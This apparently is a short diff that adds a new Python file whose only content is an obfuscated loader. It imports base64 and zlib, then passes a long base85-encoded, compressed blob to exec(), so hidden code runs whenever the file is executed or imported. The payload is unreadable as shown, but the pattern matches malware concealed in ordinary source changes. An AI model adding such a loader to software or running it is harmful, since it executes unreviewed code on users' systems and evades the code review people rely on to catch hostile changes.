@@ -1,0 +1,3 @@
+
+import base64, zlib
+exec(zlib.decompress(base64.b85decode('c%04DTT|jN6bJBkK1Cf$p`uPJunaqZtH@0p3JMF(j$G0-y+GSEZD~_hKl>JOSRdFOp3w82li&Q$Nf5D3#tIeH#28R&`H{Tx@p7Rtx`}P#F*aQoCdAO0Ls_>R$8r>!NF<<w7?aY#w*dwSKpmP?1EG@PzbBZuh~oLgV%EL_mul#Gh$0fe#gc+R&0y&17@MxFSbAV!EyUjZ!X&Ou8~`kYBO3bdJksWww_cm_90aW(_Mt$fz#*DStqY3g5nZW<LgiQ$>z1mPNz3f(8cF=)Q&_KE`rgxcE~k0^-L<I!@s%^?aM|wQUgF`hU7wG{J|VEKOPOkK9G#dqSF-np-JAR04#$u6BYvV+G7bOH&6NRw=fe(c6j5nf6)%aAPxgY^kaO9FtrUWOHd|fF+~{tWH`#|lKV-oe<&AcC<>y9M-SV)II@Q+f0J%y3=Xq1`I`TN#Pw(!Eli)vlQZt}SL9K2`!>DvGh_i)22HO$sb?uHGK8?MuU7vp~dF)F0#R#)0e#rGqrJj?Lm61kEQene8`y#tCl{!*x#D@~PgDuX&E%DmTR<5@R{@VXP94*7wwJPcDWm6DbSP~w-{>xjJ#X9A3yj!Fb?#Eb!D{(UY_FFtr(*JoYN6hoK8`ZNFL0GY^oBQ`6f39g8S)niK$hc0ahGVBr)e6@ni$Z$?e13U;N&ErlD|GS')).decode())
